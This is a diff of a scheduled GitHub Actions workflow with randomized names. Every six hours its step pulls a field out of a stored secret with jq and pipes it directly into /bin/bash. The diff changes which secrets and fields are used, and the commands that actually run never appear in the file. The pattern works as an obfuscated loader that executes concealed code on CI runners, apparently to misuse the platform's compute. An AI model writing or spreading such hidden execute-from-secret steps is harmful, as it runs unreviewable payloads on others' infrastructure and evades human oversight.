@@ -3,9 +3,8 @@ name: yanshisy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
-
-jobs:  # 15762
+    - cron: '59 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,23 +12,13 @@ jobs:  # 15762
       - uses: actions/checkout@v4
       - name: yanshisy
         env:
-          zrm4666: ${{ secrets.zrm4666 }}
+          gl51297: ${{ secrets.gl51297 }}
         run: |
-          echo $zrm4666 | jq -r .bgni5 | /bin/bash
-          echo $riomi1741 | jq -r .uq6 | /bin/bash
-          echo $jmst8185 | jq -r .nxv25012 | /bin/bash
-          echo $xv37 | jq -r .dlwqy38 | /bin/bash
-          echo $nyzo40 | jq -r .s130 | /bin/bash
-          echo $tst591 | jq -r .iv96079 | /bin/bash
-          echo $hzuru68 | jq -r .zzwfo82455 | /bin/bash
-          echo $uamm907 | jq -r .jjjn64 | /bin/bash
-          echo $fstgm68 | jq -r .nmu798 | /bin/bash
-          echo $osp439 | jq -r .c67 | /bin/bash
-          echo $xc4063 | jq -r .z8966 | /bin/bash
-          echo $bu17 | jq -r .va8 | /bin/bash
-          echo $yrmu46675 | jq -r .ahv2566 | /bin/bash
-          echo $llwln322 | jq -r .wjdiw3147 | /bin/bash
-          echo $g1 | jq -r .ie2 | /bin/bash
-          echo $nuvnm3 | jq -r .lqj82919 | /bin/bash
-          echo $irz12475 | jq -r .kn27 | /bin/bash
+          echo $gl51297 | jq -r .t8 | /bin/bash
+          echo $mybkt4 | jq -r .g55561 | /bin/bash
+          echo $kkar7 | jq -r .h2 | /bin/bash
+          echo $tkfpt0173 | jq -r .ujhi4793 | /bin/bash
+          echo $xgln05990 | jq -r .hwfmk67 | /bin/bash
+          echo $b95 | jq -r .dipv6629 | /bin/bash
+          echo $rcb957 | jq -r .u25771 | /bin/bash
 
